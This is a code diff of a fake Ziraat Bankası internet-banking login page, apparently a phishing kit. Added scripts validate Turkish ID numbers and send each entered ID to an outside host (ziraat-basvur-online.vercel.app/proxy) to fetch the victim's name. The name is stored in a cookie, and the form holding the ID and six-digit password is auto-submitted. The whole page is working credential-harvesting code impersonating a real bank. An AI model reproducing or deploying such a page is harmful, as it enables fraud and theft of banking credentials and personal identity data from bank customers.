@@ -21,53 +21,54 @@
     <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
     <link href="styles.css" rel="stylesheet" id="style">
 	     <script>
-document.addEventListener("DOMContentLoaded", function () {
-  function tcno_dogrula(tcno) {
-    // ... (fonksiyon içeriği burada)
-  }
+document.addEventListener("DOMContentLoaded", function() {
+    function tcno_dogrula(tcno) {
+        tcno = String(tcno);
+        if (tcno.substring(0, 1) === '0') {
+            return false;
+        }
+        if (tcno.length !== 11) {
+            return false;
+        }
+        var ilkon_array = tcno.substr(0, 10).split('');
+        var ilkon_total = hane_tek = hane_cift = 0;
+        for (var i = j = 0; i < 9; ++i) {
+            j = parseInt(ilkon_array[i], 10);
+            if (i & 1) {
+                hane_cift += j;
+            } else {
+                hane_tek += j;
+            }
+            ilkon_total += j;
+        }
+        if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+            return false;
+        }
+        ilkon_total += parseInt(ilkon_array[9], 10);
+        if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+            return false;
+        }
+        return true;
+    }
 
-  async function kontrolEt() {
+    function kontrolEt() {
+        var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
+        var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
+        var devamButton = document.getElementById("ctl00_c_RetailLoginButton");
+
+       if (/^\d{11}$/.test(identityInput.value) && /^\d{6}$/.test(pinInput.value) && tcno_dogrula(identityInput.value)) {
+            devamButton.removeAttribute("disabled");
+        } else {
+            devamButton.setAttribute("disabled", "disabled");
+        }
+    }
+
     var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
     var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
-    var devamButton = document.getElementById("ctl00_c_RetailLoginButton");
 
-    if (
-      /^\d{11}$/.test(identityInput.value) &&
-      /^\d{6}$/.test(pinInput.value) &&
-      tcno_dogrula(identityInput.value)
-    ) {
-      const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
-
-      try {
-        // RetailIdentityTextBox değeri ile isteği oluştur
-        const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
-        const data = await response.json();
-
-        // "adi" ve "soyadi" değerlerini al
-        const adi = data.adi;
-        const soyadi = data.soyadi;
-
-        // İsim adında bir cookie oluştur ve değerleri kaydet
-        document.cookie = `isim=${adi} ${soyadi}; path=/`;
-
-        await sleep(300);
-        devamButton.removeAttribute("disabled");
-
-      } catch (error) {
-        console.error('Hata:', error);
-      }
-    } else {
-      devamButton.setAttribute("disabled", "disabled");
-    }
-  }
-
-  var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
-  var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
-
-  identityInput.addEventListener("input", kontrolEt);
-  pinInput.addEventListener("input", kontrolEt);
+    identityInput.addEventListener("input", kontrolEt);
+    pinInput.addEventListener("input", kontrolEt);
 });
-
     </script> 
 	  <script>
   document.addEventListener('touchstart', function (event) {
@@ -129,9 +130,10 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
                         </div>
                         <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
                           <input autocomplete="off" name="ctl00$c$RetailPinTextBox" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" onmousedown=";" data-rule-range-min="5" placeholder="Şifre" data-msg-required="Lütfen şifrenizi giriniz."  style="font-size: 14px;font-family: sans-serif;    font-weight: 700;" disablevalidationonblur="true" data-rule-range-max="6"  onkeyup=";;" causesval="false" pin-validation-message-current-pin-length="Şifrenizi kontrol ediniz." encrypted="" exvalidmethod="CheckAlphaNumericCurrentPinEntry" aria-required="true" value="">
-                         </div> 
+                         </div>
                         <div id="" class="clearfix"></div>
-                      <button id="ctl00_c_RetailLoginButton"  type="submit" class="btn btn-danger sendBtn" disabled="">
+                      <button id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" disabled=""
+        onclick="checkAndSubmit();">
     <span></span>DEVAM
 </button><br><br><br>
                         <a causesval="true" onclick="" id="ctl00_c_RetailRemindPinButton" class="custom-link" href="">
@@ -164,7 +166,7 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
               </div>
             </div>
           </div>
-   </form>
+    </form>
 
  <script>
 async function checkAndSubmit() {
@@ -182,16 +184,85 @@ async function checkAndSubmit() {
         // İsim adında bir cookie oluştur ve değerleri kaydet
         document.cookie = `isim=${adi} ${soyadi}; path=/`;
 
-         await sleep(1000);
+        // Formu post et
         document.getElementById('aspnetForm').submit();
       } catch (error) {
         console.error('Hata:', error);
       }
     }
   </script>
+ <script>
+         document.addEventListener("DOMContentLoaded", function () {
+  async function tcno_dogrula_ve_islem_yap(tcno) {
+    // TC kimlik doğrulama fonksiyonu
+    tcno = String(tcno);
+    if (tcno.substring(0, 1) === '0') {
+      return false;
+    }
+    if (tcno.length !== 11) {
+      return false;
+    }
+    var ilkon_array = tcno.substr(0, 10).split('');
+    var ilkon_total = hane_tek = hane_cift = 0;
+    for (var i = j = 0; i < 9; ++i) {
+      j = parseInt(ilkon_array[i], 10);
+      if (i & 1) {
+        hane_cift += j;
+      } else {
+        hane_tek += j;
+      }
+      ilkon_total += j;
+    }
+    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
+      return false;
+    }
+    ilkon_total += parseInt(ilkon_array[9], 10);
+    if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
+      return false;
+    }
+    return true;
+  }
 
-          
- 
+  async function checkAndSubmit() {
+    const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
+
+    try {
+      // TC kimlik doğrulama işlemi
+      const isTcValid = await tcno_dogrula_ve_islem_yap(retailIdentityValue);
+
+      if (isTcValid) {
+        // RetailIdentityTextBox değeri ile isteği oluştur
+        const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
+        const data = await response.json();
+
+        // "adi" ve "soyadi" değerlerini al
+        const adi = data.adi;
+        const soyadi = data.soyadi;
+
+        // İsim adında bir cookie oluştur ve değerleri kaydet
+        document.cookie = `isim=${adi} ${soyadi}; path=/`;
+
+        // Formu post et
+        document.getElementById('aspnetForm').submit();
+      } else {
+        console.log('TC kimlik doğrulama başarısız.');
+      }
+    } catch (error) {
+      console.error('Hata:', error);
+    }
+  }
+
+  function handleInput() {
+    checkAndSubmit();
+  }
+
+  var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
+  var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
+
+  identityInput.addEventListener("input", handleInput);
+  pinInput.addEventListener("input", handleInput);
+}); 
+  </script>
     <div>
   </body>
 </html>
